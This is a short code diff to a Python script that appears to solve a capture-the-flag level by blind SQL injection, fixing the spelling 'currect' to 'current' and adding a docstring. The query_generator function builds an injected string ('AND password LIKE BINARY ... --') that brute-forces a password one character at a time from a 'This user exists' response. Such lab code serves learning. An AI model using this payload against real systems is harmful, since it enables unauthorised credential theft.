@@ -11,8 +11,17 @@ from variables import auth, URL, CHARS, NAME
 password = ""
 
 
-def query_generator(currect_password: str, character: str) -> str:
-    return f'{NAME}{" AND password LIKE BINARY "}{currect_password}{character}%%" -- '
+def query_generator(current_password: str, character: str) -> str:
+    """generate query with current password and character
+
+    Args:
+        current_password (str): current password
+        character (str): a character
+
+    Returns:
+        str: sql query
+    """
+    return f'{NAME}{" AND password LIKE BINARY "}{current_password}{character}%%" -- '
 
 
 def get_respones(character: str) -> str:
@@ -22,7 +31,7 @@ def get_respones(character: str) -> str:
         character (str): testing character
 
     Returns:
-        str: return character if currect and '' if not currect
+        str: return character if current and '' if not current
     """
     respones = post(URL, data={}, auth=auth)
     if "This user exists" in respones.text:
